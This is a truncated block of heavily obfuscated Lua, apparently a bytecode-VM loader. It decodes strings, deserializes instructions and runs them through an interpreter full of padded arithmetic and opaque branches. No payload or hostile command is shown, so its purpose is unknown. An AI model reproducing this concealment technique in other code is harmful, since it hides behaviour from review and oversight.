do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v69=v2(v0(v30,16));if v19 then local v80=0;local v81;while true do if (v80==1) then return v81;end if (0==v80) then v81=v5(v69,v19);v19=nil;v80=1;end end else return v69;end end end);local function v20(v31,v32,v33)if v33 then local v70=0 -0 ;local v71;while true do if (v70==(0 + 0)) then v71=(v31/((4 -2)^(v32-(3 -2))))%((7 -(1 + 4))^(((v33-1) -(v32-(1 + 0))) + 1)) ;return v71-(v71%(1 + (0 -0))) ;end end else local v72=0 + 0 ;local v73;while true do if (v72==(372 -(173 + 199))) then v73=(1085 -(42 + 1041))^(v32-(584 -(105 + 181 + (511 -(70 + 144))))) ;return (((v31%(v73 + v73))>=v73) and (1816 -(1602 + 213))) or ((2208 -(1293 + 454)) -(146 + 315)) ;end end end end local function v21()local v38=(1004 -(856 + 148)) -0 ;local v39;while true do if (v38==(1 + (0 -0))) then return v39;end if (v38==0) then v39=v1(v16,v18,v18);v18=v18 + (403 -(219 + 183)) ;v38=2 -1 ;end end end local function v22()local v40=0 -0 ;local v41;local v42;while true do if (v40==(174 -(48 + 125))) then return (v42 * (1280 -(379 + 645))) + v41 ;end if (v40==(0 -0)) then v41,v42=v1(v16,v18,v18 + 2 + (0 -0) );v18=v18 + (1427 -(1031 + 394)) ;v40=1 + (0 -0) ;end end end local function v23()local v43,v44,v45,v46=v1(v16,v18,v18 + 3 );v18=v18 + (7 -3) ;return (v46 * (57423071 -40645855)) + (v45 * (66509 -((1285 -556) + 244))) + (v44 * (188 + 68)) + v43 ;end local function v24()local v47=v23();local v48=v23();local v49=1000 -(380 + 619) ;local v50=(v20(v48,2 -1 ,16 + 4 ) * ((2 + 0)^(112 -80))) + v47 ;local v51=v20(v48,21,10 + 21 );local v52=((v20(v48,(1287 + 505) -(97 + 1663) )==(1 + 0)) and  -(1330 -((2707 -1744) + 366))) or 1 ;if (v51==(0 + 0)) then if (v50==0) then return v52 * (0 + 0) ;else v51=1 + 0 + 0 ;v49=0 -0 ;end elseif (v51==(2716 -(479 + 190))) then return ((v50==(1397 -(805 + 592))) and (v52 * (((1 + 1) -(684 -(132 + 551)))/(0 + 0)))) or (v52 * NaN) ;end return v8(v52,v51-((4561 -(945 + 727)) -(1359 + 507)) ) * (v49 + (v50/((8 -6)^(125 -73)))) ;end local function v25(v34)local v53;if  not v34 then local v74=(0 -0) + 0 ;while true do if (v74==(0 -0)) then v34=v23();if (v34==0) then return "";end break;end end end v53=v3(v16,v18,(v18 + v34) -(1 -0) );v18=v18 + v34 ;local v54={};for v67=1118 -(249 + 868) , #v53 do v54[v67]=v2(v1(v3(v53,v67,v67)));end return v6(v54);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v55=0;local v56;local v57;local v58;local v59;local v60;local v61;local v62;local v63;while true do if (v55~=(1 -0)) then else v58=nil;v59=nil;v55=3 -1 ;end if (v55==3) then v62=nil;v63=nil;v55=5 -1 ;end if (v55~=0) then else v56=0;v57=nil;v55=4 -3 ;end if (v55==4) then while true do if ((3 + 0)~=v56) then else v63=nil;while true do local v100=0;local v101;while true do if (v100==(180 -(136 + 44))) then v101=0 + 0 ;while true do if (v101==0) then local v106=0;while true do if (v106==0) then if (v57~=(1654 -(101 + 1551))) then else local v115=0;while true do if (v115==1) then for v118=1,v23() do v60[v118]=v23();end return v61;end if (v115==0) then for v120=2 -1 ,v23() do local v121=0 + 0 ;local v122;while true do if ((667 -(106 + 561))==v121) then v122=v21();if (v20(v122,1 + 0 ,1 + 0 )==(0 -0)) then local v216=0 + 0 ;local v217;local v218;local v219;local v220;local v221;local v222;while true do if (v216~=(4 -2)) then else v221=nil;v222=nil;v216=3;end if ((725 -(575 + 150))==v216) then v217=0;v218=nil;v216=1 + 0 ;end if (v216==3) then while true do if (v217~=(1 + 0)) then else local v279=0 -0 ;while true do if (v279~=(0 -0)) then else v220=nil;v221=nil;v279=3 -2 ;end if (v279==(1 -0)) then v217=2;break;end end end if (v217==2) then v222=nil;while true do if (v218~=(1457 -(826 + 631))) then else local v309=628 -(551 + 77) ;while true do if (v309==(2 -1)) then v218=1 + 0 ;break;end if (v309==0) then v219=0;v220=nil;v309=1;end end end if (v218~=2) then else while true do if ((0 + 0)~=v219) then else local v327=1076 -(244 + 832) ;while true do if (v327==(1930 -(1611 + 319))) then local v345=0;while true do if (v345~=(515 -(226 + 289))) then else local v352=0;while true do if (v352~=(1 + 0)) then else v345=1;break;end if (v352~=(0 + 0)) then else v220=v20(v122,719 -(454 + 263) ,258 -(77 + 178) );v221=v20(v122,1293 -(674 + 615) ,6);v352=1;end end end if ((1843 -(1256 + 586))~=v345) then else v327=2 -1 ;break;end end end if (v327==1) then v219=1 + 0 ;break;end end end if ((243 -(234 + 7))~=v219) then else local v328=0;local v329;while true do if (v328==0) then v329=0 + 0 ;while true do if (v329~=0) then else local v353=949 -(311 + 638) ;local v354;while true do if (v353==(1716 -(1420 + 296))) then v354=0;while true do if (v354~=(0 + 0)) then else local v362=0;while true do if (v362==1) then v354=1;break;end if (v362==(0 -0)) then if (v20(v221,1,3 -2 )==(1 + 0)) then v222[2]=v63[v222[7 -5 ]];end if (v20(v221,2,2)==(4 -3)) then v222[3]=v63[v222[3]];end v362=598 -(433 + 164) ;end end end if ((1 + 0)==v354) then v329=1;break;end end break;end end end if (v329==1) then v219=2 + 1 ;break;end end break;end end end if (v219~=(2 -1)) then else local v330=0 -0 ;local v331;while true do if (v330==0) then v331=0 + 0 ;while true do if (v331~=0) then else local v355=0 + 0 ;while true do if (v355==1) then v331=1;break;end if (0~=v355) then else v222={v22(),v22(),nil,nil};if (v220==0) then local v359=0;local v360;local v361;while true do if (v359==(764 -(135 + 629))) then v360=0 -0 ;v361=nil;v359=1 + 0 ;end if (v359==1) then while true do if (v360==0) then v361=0 + 0 ;while true do if ((0 + 0)~=v361) then else v222[571 -(342 + 226) ]=v22();v222[1 + 3 ]=v22();break;end end break;end end break;end end elseif (v220==1) then v222[1 + 2 ]=v23();elseif (v220==(1969 -(188 + 1779))) then v222[5 -2 ]=v23() -((3 -1)^(16 + 0)) ;elseif (v220==3) then local v369=0 -0 ;local v370;local v371;while true do if (v369==(0 -0)) then v370=0;v371=nil;v369=1;end if (v369==(1891 -(1281 + 609))) then while true do if (v370~=0) then else v371=0;while true do if (v371~=0) then else v222[3]=v23() -((1 + 1)^(526 -(355 + 155))) ;v222[4 + 0 ]=v22();break;end end break;end end break;end end end v355=1;end end end if (v331==(1 + 0)) then v219=2;break;end end break;end end end if (v219==(153 -(128 + 22))) then if (v20(v221,3,3)==1) then v222[4]=v63[v222[4]];end v58[v120]=v222;break;end end break;end if (v218==(1709 -(1421 + 287))) then local v310=0;local v311;while true do if (v310~=0) then else v311=0;while true do if (v311==1) then v218=2;break;end if (v311~=(0 + 0)) then else local v346=0;while true do if (v346==0) then v221=nil;v222=nil;v346=1;end if (v346==(1 + 0)) then v311=1;break;end end end end break;end end end end break;end if (v217~=(0 -0)) then else v218=1979 -(381 + 1598) ;v219=nil;v217=2 -1 ;end end break;end if (v216~=1) then else v219=nil;v220=nil;v216=2 -0 ;end end end break;end end end for v123=1,v23() do v59[v123-1 ]=v28();end v115=1;end end end if (v57==0) then local v116=0;while true do if (v116==1) then v60={};v61={v58,v59,nil,v60};v116=192 -(76 + 114) ;end if (v116~=2) then else v57=1;break;end if (v116==0) then v58={};v59={};v116=1953 -(548 + 1404) ;end end end v106=786 -(437 + 348) ;end if (v106~=(540 -(291 + 248))) then else v101=1 + 0 ;break;end end end if ((1 + 0)~=v101) then else if (v57==(3 -2)) then v62=v23();v63={};for v110=1870 -(1480 + 389) ,v62 do local v111=0 + 0 ;local v112;local v113;local v114;while true do if (v111==(1 + 0)) then v114=nil;while true do if (v112~=(0 + 0)) then else local v125=0;while true do if (v125==(0 + 0)) then local v200=1252 -(965 + 287) ;while true do if (v200~=0) then else v113=v21();v114=nil;v200=38 -(15 + 22) ;end if (v200==1) then v125=1931 -(1701 + 229) ;break;end end end if (v125==1) then v112=1 + 0 ;break;end end end if (v112==1) then if (v113==1) then v114=v21()~=0 ;elseif (v113==2) then v114=v24();elseif (v113==(5 -2)) then v114=v25();end v63[v110]=v114;break;end end break;end if (v111==(0 -0)) then v112=0 -0 ;v113=nil;v111=1;end end end v61[8 -5 ]=v21();v57=1 + 1 ;end break;end end break;end end end break;end if (v56~=(2 -0)) then else local v98=0;while true do if (v98~=1) then else v56=3 + 0 ;break;end if (v98~=(0 + 0)) then else v61=nil;v62=nil;v98=1;end end end if (v56==(1 + 0)) then local v99=0 + 0 ;while true do if (v99==1) then v56=2;break;end if (v99~=(0 -0)) then else v59=nil;v60=nil;v99=1740 -(1103 + 636) ;end end end if ((0 + 0)==v56) then v57=0 -0 ;v58=nil;v56=3 -2 ;end end break;end if (v55==2) then v60=nil;v61=nil;v55=3;end end end local function v29(v35,v36,v37)local v64=v35[1];local v65=v35[2];local v66=v35[3];return function(...)local v75=1;local v76= -1;local v77={...};local v78=v12("#",...) -1 ;local function v79()local v82=v64;local v83=v65;local v84=v66;local v85=v27;local v86={};local v87={};local v88={};for v94=0,v78 do if (((2555 -(835 + 342))<=4563) and (v94>=v84)) then v86[v94-v84 ]=v77[v94 + (1 -0) ];else v88[v94]=v77[v94 + 1 + 0 ];end end local v89=(v78-v84) + (1478 -(42 + 1435)) ;local v90;local v91;while true do local v95=0 + 0 ;local v96;local v97;while true do if ((v95==0) or (1314>(7517 -4316))) then v96=1677 -(1593 + 84) ;v97=nil;v95=1 + (136 -(5 + 131)) ;end if ((v95==1) or ((313 + 498)==3846)) then while true do if ((v96==(1823 -(67 + 845 + 911))) or ((3922 -(220 + 660))>(6471 -(1784 + 152)))) then v97=0 + 0 ;while true do if ((193<=(769 + 2017)) and (v97==0)) then local v107=1343 -(1017 + 326) ;local v108;while true do if ((v107==(0 + 0)) or ((42 + 731)<=(941 -501))) then v108=0 -0 ;while true do if ((367<(373 + 50)) and (v108==(1 + (0 -0)))) then v97=1 + 0 ;break;end if ((4990>=1615) and ((110 -(77 + 33))==v108)) then local v117=0 -0 ;while true do if ((v117==((0 + 0) -0)) or (((831 + 3876) -(25 + 2))==1579)) then v90=v82[v75];v91=v90[1 + 0 ];v117=1 -0 ;end if ((v117==1) or ((73 -46)>(6212 -((3284 -(1084 + 655)) + 172)))) then v108=1144 -(469 + 674) ;break;end end end end break;end end end if (((14317 -9676)>=(3739 -(257 + 1451))) and (v97==1)) then if ((v91<=((730 -(486 + 104)) -(84 + 40))) or ((2420 + (1934 -1030))<=(3327 -2152))) then if ((v91<=7) or (430>=1705)) then if ((v91<=(5 -2)) or ((6189 -3019)>3504)) then if (((110 + 69)==179) and (v91<=(1 + (1200 -(1085 + 115))))) then if ((v91==(0 + 0)) or (1070>=(15982 -11300))) then local v129=0 + 0 ;local v130;local v131;local v132;local v133;while true do if ((v129==(1842 -(579 + 1261))) or ((388 + 215)>3897)) then while true do if ((v130==((630 -(603 + 26)) + 1 + 0)) or (1031<=(765 -499))) then if (((9520 -6539)<(12539 -9196)) and (v132>(659 -(200 + 459)))) then if (((296 -(214 + 37))==(1708 -(192 + 1471))) and (v133<=v88[v131 + (1 -(0 -0)) ])) then local v292=0 + 0 ;local v293;local v294;while true do if (((11432 -7445)==(7675 -3688)) and (v292==(0 + 0))) then v293=(134 + 1645) -(504 + 1275) ;v294=nil;v292=1 -0 ;end if (((1 + 0)==v292) or ((7852 -(8284 -2562))<(1129 -(14 + 135 + (170 -114))))) then while true do if ((4568==(772 + 3796)) and (v293==(0 + 0))) then v294=1714 -(1307 + 407) ;while true do if ((4600>=(1091 + 830)) and ((520 -(143 + 377))==v294)) then v75=v90[1261 -(1210 + 48) ];v88[v131 + 1 + 2 ]=v133;break;end end break;end end break;end end end elseif ((4693==4693) and (v133>=v88[v131 + (1 -0) ])) then local v295=1492 -(674 + 818) ;local v296;local v297;while true do if ((v295==(1 + 0)) or ((4336 -(747 + 933))<(1453 -(490 + 582)))) then while true do if (((3605 + 1353)>=(684 + 148)) and (v296==(0 + 0))) then v297=0 + 0 ;while true do if ((4494>(1646 + 2041)) and (v297==0)) then v75=v90[3];v88[v131 + (4 -2) + 1 ]=v133;break;end end break;end end break;end if ((v295==(855 -((1333 -660) + 182))) or (2095>(4668 -2475))) then v296=715 -(329 + 386) ;v297=nil;v295=1 + (617 -(516 + 101)) ;end end end break;end if ((v130==0) or (1678==(4091 -(613 + (203 -65))))) then v131=v90[1 + (591 -(73 + 517)) ];v132=v88[v131 + 2 ];v130=1;end if ((v130==(1 + 0)) or ((451 -(83 + 282))>(924 + 1794))) then local v234=0 + 0 ;while true do if ((v234==(1 -0)) or (((19206 -12604) -(1875 + 61))<=((4111 -2711) -(12 + 94)))) then v130=1892 -(157 + 324 + 1409) ;break;end if (((3758 -(1255 + 256))<=(9311 -5482)) and (v234==(0 -0))) then v133=v88[v131] + v132 ;v88[v131]=v133;v234=1;end end end end break;end if ((v129==(1 + 0)) or ((3843 -2937)>=1133)) then v132=nil;v133=nil;v129=291 -(126 + 163) ;end if ((v129==(1292 -(428 + 864))) or ((3934 -2107)>=3854)) then v130=0 + (1969 -(1463 + 506)) ;v131=nil;v129=(1050 -(561 + 485)) -3 ;end end else v88[v90[1943 -(793 + 1148) ]]=v90[3 + 0 ];end elseif ((3863==(5379 -(697 + 819))) and (v91==2)) then local v136=0 -0 ;local v137;local v138;local v139;local v140;local v141;while true do if ((2==v136) or ((3136 -(4 + 28))<(223 -71))) then v141=nil;while true do if ((v137==(1 + 0)) or ((2048 + 2267)<=(1461 -(527 + 63)))) then local v235=0;local v236;while true do if ((v235==(0 + 0)) or ((2559 -(234 + 252))<=(1125 -829))) then v236=0 + 0 ;while true do if (((199 + 2702)>=(87 + 157)) and ((1 + 0)==v236)) then v137=375 -(272 + 101) ;break;end if (((1383 + 1362)<(1604 + 2471)) and (v236==(0 + 0 + 0))) then local v312=0;while true do if ((v312==(962 -(558 + 403))) or ((1006 -(588 + 95))==(2981 + 1350))) then v236=1 + (1891 -(834 + 1057)) ;break;end if ((v312==(1616 -(262 + 1354))) or ((1098 + (1729 -1001))==(5843 -(100 + 1280)))) then v76=(v140 + v138) -1 ;v141=0;v312=1;end end end end break;end end end if (((148 + 138)<=3173) and (v137==(0 -0))) then local v237=0;while true do if (((6807 -3228)==3579) and (v237==(0 + 0))) then local v281=0;while true do if (((3 -2)==v281) or ((5838 -1939)<(361 + 2981))) then v237=2 -(4 -3) ;break;end if ((2209<4338) and (v281==(0 -0))) then v138=v90[2];v139,v140=v85(v88[v138](v88[v138 + 1 + 0 ]));v281=1 + 0 ;end end end if ((v237==1) or ((7667 -3051)<=((1259 -(372 + 183)) + 2747))) then v137=165 -(14 + 150) ;break;end end end if ((v137==(4 -2)) or ((473 + 3779)<(9976 -6109))) then for v254=v138,v76 do local v255=0 + 0 ;while true do if (((676 + 982)==(270 + 1388)) and (v255==(0 + 0))) then v141=v141 + 1 ;v88[v254]=v139[v141];break;end end end break;end end break;end if ((v136==0) or (((1448 -(607 + 405)) + 13)>3690)) then v137=0;v138=nil;v136=1 + 0 ;end if ((v136==1) or ((4 + 235)>(3455 -(824 + 1135)))) then local v223=0;while true do if (((4500 -2921)<((288 + 5378) -3699)) and (v223==(0 + 0))) then v139=nil;v140=nil;v223=1 -0 ;end if ((v223==1) or ((256 -163)>=(4642 + 104))) then v136=8 -6 ;break;end end end end else v88[v90[415 -(54 + 359) ]]=v36[v90[6 -3 ]];end elseif ((v91<=(16 -11)) or ((2156 -(1415 + (791 -384)))>(5390 -(374 + (3141 -2326))))) then if ((3689<=(165 + 1320 + 3484)) and (v91==(3 + 1))) then v88[v90[1 + 1 ]]=v88[v90[1110 -(77 + 1030) ]]%v88[v90[4 + 0 ]] ;else do return;end end elseif (((9792 -6217)==(924 + 2651)) and (v91>(944 -(773 + 165)))) then local v145=934 -(350 + 584) ;local v146;local v147;while true do if ((v145==(0 + 0)) or ((3706 + 912)<=960)) then local v224=0 -0 ;while true do if ((0==v224) or ((92 + 158)>=(1039 + 497))) then v146=0 + 0 ;v147=nil;v224=1;end if ((((1111 -(80 + 179)) -(426 + (1020 -(387 + 426))))<652) and ((1 -0)==v224)) then v145=1 -0 ;break;end end end if (((19574 -15493)==(2104 + 1977)) and (v145==(1 + 0))) then while true do if ((v146==(0 + 0)) or ((3826 -(197 + 181))<=(4079 -(880 + 347)))) then v147=v88[v90[534 -((884 -614) + 260) ]];if (((3525 -2461)==(184 + 880)) and  not v147) then v75=v75 + ((1 + 0) -0) ;else local v269=0 + 0 ;local v270;local v271;while true do if ((4885<(20184 -15223)) and (v269==(821 -(508 + 313)))) then v270=1500 -(427 + 1073) ;v271=nil;v269=(3 -2) + 0 ;end if (((2992 -(24 + 93))>(58 + 344)) and ((1449 -(1408 + 40))==v269)) then while true do if (((574 -388)<(6004 -1965)) and (v270==(231 -(85 + 146)))) then v271=0;while true do if (((1352 -(1280 -(297 + 245)))<=(2994 -1475)) and (v271==0)) then v88[v90[769 -(550 + 217) ]]=v147;v75=v90[579 -(432 + 144) ];break;end end break;end end break;end end end break;end end break;end end else local v148=0 + 0 ;local v149;local v150;local v151;local v152;local v153;while true do if (((1359 + 1682)>=(858 -(94 + 186 + 167))) and (v148==(662 -(569 + 91)))) then v153=nil;while true do if ((v149==(1227 -(52 + 54 + (2482 -(672 + 691))))) or ((10514 -6164)<1778)) then for v256=v150,v76 do local v257=930 -(635 + 295) ;local v258;while true do if ((v257==0) or ((4025 -(78 + 261))<=1007)) then v258=1215 -(228 + 987) ;while true do if ((((3221 -(527 + 540)) -(57 + 392))==(1825 -((96 -51) + 75))) and (v258==(0 -0))) then v153=v153 + 1 + 0 ;v88[v256]=v151[v153];break;end end break;end end end break;end if (((1 + 0)==v149) or ((3308 -(468 + 447))<(676 -(596 + 4)))) then v76=(v152 + v150) -(502 -(289 + 212)) ;v153=0;v149=2 + 0 ;end if ((v149==(0 + 0)) or (((1196 -696) -337)>((2998 + 2660) -(568 + (272 -149))))) then v150=v90[2];v151,v152=v85(v88[v150](v13(v88,v150 + (1 -0) ,v76)));v149=(1 + 1) -1 ;end end break;end if (((659 + 301)<(2344 -(33 + 88))) and (v148==((0 -0) + 0))) then v149=0 + 0 ;v150=nil;v148=1222 -(355 + 866) ;end if ((4007>(195 + 369)) and (v148==(2 -(1 + 0)))) then v151=nil;v152=nil;v148=(3042 -(1232 + 476)) -(285 + 721 + 326) ;end end end elseif (((3926 + 602)>(3420 -(230 + 342))) and (v91<=(26 -15))) then if ((1420<=(6245 -(757 + 535))) and (v91<=(1576 -(535 + 1032)))) then if ((v91>(10 -(4 -2))) or ((2975 -1530)<=(913 + 10))) then v88[v90[364 -(197 + 165) ]]=v37[v90[(978 -(29 + 872)) -(9 + 65) ]];else for v201=v90[480 -(103 + 375) ],v90[5 -2 ] do v88[v201]=nil;end end elseif ((1129<=(7 + 3921)) and (v91==(1878 -(954 + 914)))) then local v156=(0 + 0) -0 ;local v157;local v158;local v159;local v160;local v161;while true do if (((5325 -(624 + 95))>(898 -413)) and (v156==1)) then v159=nil;v160=nil;v156=3 -1 ;end if (((656 + 3362)>=(3849 -(152 + 342))) and (v156==(2 + 0))) then v161=nil;while true do if ((v157==2) or ((3096 -(48 + 311))>(2246 + 2395))) then while true do if ((v158==0) or ((6690 -4306)<=1330)) then local v282=0 -(0 -0) ;local v283;while true do if ((v282==(0 + 0)) or ((5705 -(153 + 643 + 736))==(8435 -6213))) then v283=0;while true do if (((4982 -3912)<(5124 -(22 + (2087 -1148)))) and ((562 -(457 + 105))==v283)) then v159=v90[(1952 -(1156 + 210)) -(461 + 123) ];v160=v88[v159];v283=1 + 0 ;end if ((((60890 -37862) -18079)==(2929 + 2020)) and (v283==(1 + 0))) then v158=1753 -(634 + 1118) ;break;end end break;end end end if (((8572 -(6490 -(417 + 724)))<(12991 -(6629 + 2099))) and (v158==1)) then v161=v88[v159 + (1351 -(69 + 1280)) ];if (((7084 -4253)<((2379 -1189) + 2782)) and (v161>(0 + (914 -(644 + 270))))) then if ((v160>v88[v159 + 1 + 0 ]) or ((7038 -(15450 -10010))<=(2033 -(716 + 641)))) then v75=v90[644 -(112 + 529) ];else v88[v159 + 1 + 2 ]=v160;end elseif (((2066 -(446 + 330))==(2430 -1140)) and (v160<v88[v159 + 1 ])) then v75=v90[3 + 0 ];else v88[v159 + (1941 -(1294 + 644)) ]=v160;end break;end end break;end if (((6075 -2984)>=996) and (v157==(628 -(511 + 116)))) then v160=nil;v161=nil;v157=2 + 0 ;end if (((384 + 261)<(1456 + 1221)) and (v157==0)) then local v240=0 + 0 ;while true do if ((1==v240) or ((1265 + 181)>(3079 + 1493))) then v157=1725 -(719 + 1005) ;break;end if ((v240==0) or (1852<=(4198 -2987))) then v158=0;v159=nil;v240=1 + 0 ;end end end end break;end if ((v156==(0 + 0)) or ((4156 -(1099 + 389))==(1686 + 301))) then v157=0 + 0 ;v158=nil;v156=463 -(332 + 130) ;end end else v37[v90[483 -(186 + 294) ]]=v88[v90[1095 -(923 + 170) ]];end elseif (((1389 + 1944)>=(8635 -6586)) and (v91<=13)) then if ((v91==(466 -(109 + 345))) or ((3681 -(1198 + 83))<=(39 + (1187 -(76 + 50))))) then v88[v90[2 + 0 ]]=v88[v90[3]] -v90[(1232 -534) -(595 + 99) ] ;else v88[v90[(6 -1) -3 ]]=v88[v90[2 + 1 ]]%v90[6 -(452 -(289 + 161)) ] ;end elseif (((115 + 832)<=(13059 -9816)) and (v91<=((1022 -(41 + 701)) -(230 + 36)))) then if (((1202 + 1641)<(15173 -11002)) and (v90[1 + 0 + 1 ]==v88[v90[(1 + 11) -8 ]])) then v75=v75 + (560 -(555 + 4)) ;else v75=v90[1 + 2 + 0 ];end elseif ((v91==(1298 -(242 + 1041))) or ((15151 -10882)<(2603 -(115 + 123)))) then v88[v90[(4 + 3) -5 ]]=v88[v90[3]];else v88[v90[1 + 1 ]]=v88[v90[3]][v90[4]];end elseif ((1457==(3239 -1782)) and (v91<=(701 -(510 + 167)))) then if (((402 + 3518)>=(171 + 1621 + 1114)) and (v91<=(11 + 9))) then if ((v91<=18) or ((1285 + 1001)<=((2031 -(19 + 986)) -(190 + (1547 -(511 + 453)))))) then if ((2173>=426) and (v91==(150 -(28 + 105)))) then if (((10796 -6905)==(2961 + 930)) and (v88[v90[4 -2 ]]==v90[4 + 0 ])) then v75=v75 + (3 -2) ;else v75=v90[3 + 0 ];end else local v166=0 -0 ;local v167;local v168;local v169;while true do if (((1686 -(900 + 158))==628) and (v166==(280 -(278 + 1)))) then v169=nil;while true do if ((753<=(396 + 143 + 575)) and (v167==0)) then local v241=0 -0 ;while true do if ((v241==(0 -0)) or (((3656 -2832) + 1174)<((135 -80) + 127))) then v168=0 + 0 ;v169=nil;v241=1;end if (((1544 -858)<4168) and (v241==1)) then v167=1 + (357 -(198 + 159)) ;break;end end end if ((v167==1) or ((3013 -2295)<(484 -(16 + 208)))) then while true do if ((v168==(0 -0)) or (1244<1127)) then v169=v90[816 -(625 + 189) ];do return v88[v169](v13(v88,v169 + (1746 -((1397 -(134 + 475)) + 957)) ,v90[3 -0 ]));end break;end end break;end end break;end if ((2738==(9068 -6330)) and (v166==(0 -0))) then v167=176 -(111 + 65) ;v168=nil;v166=1 + 0 ;end end end elseif ((2252<(561 + 2294)) and (v91==(7 + 12))) then v88[v90[3 -1 ]]=v90[3 + 0 ]~=(0 -(1824 -(1756 + 68))) ;else local v171=0 -0 ;local v172;local v173;while true do if ((((2456 -(169 + 307)) -(1469 + 510))==v171) or ((6013 -(949 + 97))==638)) then while true do if ((v172==0) or (((9801 -3888) -(396 + 767))<(1888 + 2638))) then v173=v90[2];v88[v173](v13(v88,v173 + (99 -(68 + 30)) ,v76));break;end end break;end if (((4533 + 329)>(3831 -2956)) and (((0 -0) + 0)==v171)) then v172=0;v173=nil;v171=1 -0 ;end end end elseif (((8756 -5220)==(16117 -12581)) and (v91<=(740 -(656 + 62)))) then if ((v91>21) or ((340 + 1048)==(4083 -(912 + 1601)))) then local v174=210 -(145 + 65) ;local v175;local v176;local v177;while true do if (((3407 -(617 + 818))<(3445 + 1162)) and (1==v174)) then v177=nil;while true do if (((3698 -(326 + 1297))<(3415 -(679 + 571))) and (v175==(1486 -((2122 -(481 + 1015)) + 860)))) then local v243=0 -0 ;local v244;while true do if (((0 + (0 -0))==v243) or (1876>=(701 + 2113))) then v244=1940 -(1167 + 207 + 566) ;while true do if (((0 -0)==v244) or (3545<((3125 + 4732) -5716))) then local v314=0;while true do if (((1441 -(884 + 557))==v314) or ((3124 -(392 + 826))<(741 + 97))) then v176=v90[2];v177=v88[v90[3 -0 ]];v314=1 -(0 + 0) ;end if (((4301 -(242 + 13))>(5225 -(140 + 1437))) and (v314==((202 + 454) -(393 + 262)))) then v244=1;break;end end end if (((138 + 1306)==(5595 -4151)) and (v244==((416 -(35 + 1)) -(145 + 234)))) then v175=700 -(369 + 330) ;break;end end break;end end end if ((v175==(1075 -(979 + 95))) or ((3409 -(1399 + 175))>3505)) then v88[v176 + (1 -0) ]=v177;v88[v176]=v177[v90[4]];break;end end break;end if ((((4268 -(277 + 176)) -(427 + 1220))>((3235 -1900) -((1431 -(841 + 73)) + 169))) and (v174==(123 -(60 + 63)))) then local v225=(0 -0) -0 ;while true do if (((2436 -1613)>=(1704 -(459 + 564))) and ((915 -(250 + 665))==v225)) then v175=0 + 0 ;v176=nil;v225=1;end if ((v225==(1 + 0)) or ((9988 -6238)<(2178 -(195 + 214)))) then v174=1;break;end end end end else local v178=0 -0 ;local v179;local v180;local v181;while true do if ((1==v178) or (((5082 -1942) -(76 + 25))>3421)) then v181=nil;while true do if (((3538 -(181 + 748))>(4612 -2679)) and (v179==(1619 -((2585 -(1908 + 37)) + 978)))) then for v259=1, #v87 do local v260=1797 -(125 + 1672) ;local v261;while true do if ((v260==(0 -0)) or ((3841 -(663 + 178 + 801))>=(7877 -3093))) then v261=v87[v259];for v302=0 + 0 , #v261 do local v303=0 -0 ;local v304;local v305;local v306;local v307;while true do if ((((15993 -(637 + 11)) -10993)>=1210) and (v303==(18 -(14 + 2)))) then while true do if ((v304==0) or ((2396 -448)>=3950)) then v305=v261[v302];v306=v305[1];v304=1798 -(1329 + 468) ;end if ((v304==(1542 -(1337 + 204))) or ((6092 -3867)>=(5893 -(165 + 1603)))) then v307=v305[2];if (((v306==v88) and (v307>=v180)) or (4144<3637)) then local v351=0;while true do if (((2635 -(1859 -(408 + 257)))<(225 + 4158)) and (v351==(1181 -(525 + (1670 -(676 + 338)))))) then v181[v307]=v306[v307];v305[1354 -(774 + 579) ]=v181;break;end end end break;end end break;end if (((1134 -618)<(2225 + 1099)) and (((13 -10) -2)==v303)) then v306=nil;v307=nil;v303=2 -0 ;end if ((v303==(0 + 0)) or (4501==(4068 + 59))) then v304=145 -(109 + 36) ;v305=nil;v303=1;end end end break;end end end break;end if ((v179==(0 + 0)) or ((8 + 2151)==(225 + 137 + 2545))) then local v248=0;local v249;while true do if (((363 -(140 + 116 + 107))==v248) or ((1875 -600)>(1723 + 1874))) then v249=1800 -(1009 + 791) ;while true do if (((857 + 2865)<=((22617 -(559 + 432)) -17069)) and (v249==1)) then v179=921 -(606 + 314) ;break;end if (((18859 -15026)>=2240) and (v249==(0 + 0))) then local v315=0 -0 ;while true do if (((4532 -(758 + 457))==(516 + 2801)) and (v315==(291 -(145 + 146)))) then v180=v90[2];v181={};v315=1 + 0 ;end if (((3604 -2773)>=(13 + (816 -(32 + 131)))) and (v315==((2 -1) + 0))) then v249=1 + (0 -0) ;break;end end end end break;end end end end break;end if (((0 -0)==v178) or ((503 + 761)>=(2585 -(41 + 392 + 606)))) then v179=0;v180=nil;v178=3 -2 ;end end end elseif ((v91==(59 -(25 + 11))) or ((6244 -3658)>((5705 + 3209) -4748))) then v88[v90[(1325 -(174 + 409)) -(735 + 5) ]]();else v88[v90[1 + 1 ]]= #v88[v90[3]];end elseif (((7452 -2841)>=(167 + 2199)) and (v91<=28)) then if ((v91<=(5 + 21)) or ((1883 + 2914)<(2024 + 224))) then if ((v91>(56 -31)) or (1125>=2984)) then v88[v90[2]]=v90[1708 -(183 + 1522) ] + v88[v90[4]] ;else local v184=0 + 0 ;local v185;local v186;while true do if (((4236 -(1095 + 690))<=(7804 -(6115 -(1203 + 96)))) and (v184==(1789 -(297 + 1491)))) then while true do if (((5740 -(990 + (258 -(25 + 128))))>4499) and (0==v185)) then v186=v90[2 + 0 + 0 ];v88[v186]=v88[v186](v13(v88,v186 + (1557 -(644 + 912)) ,v90[3 + 0 ]));break;end end break;end if ((v184==(0 + 0)) or ((3151 -(148 + 432 + 874))>=((215 + 2738) -(53 + 145 + 190)))) then v185=0 -0 ;v186=nil;v184=1 -0 ;end end end elseif (((863 + 98)>=(749 -542)) and (v91==(11 + 16))) then v88[v90[2]]=v88[v90[3]] + v90[6 -2 ] ;else v88[v90[2 + 0 ]]={};end elseif ((v91<=(1133 -(801 + 302))) or ((119 + 1683)==1377)) then if (((3594 -(392 + (1982 -(862 + 1103))))>=(7672 -5495)) and (v91>(936 -(334 + 573)))) then local v189=0 + 0 ;local v190;local v191;while true do if ((v189==0) or ((4886 -(410 + 373))<(576 + 61))) then v190=0;v191=nil;v189=3 -2 ;end if ((v189==(943 -(854 + 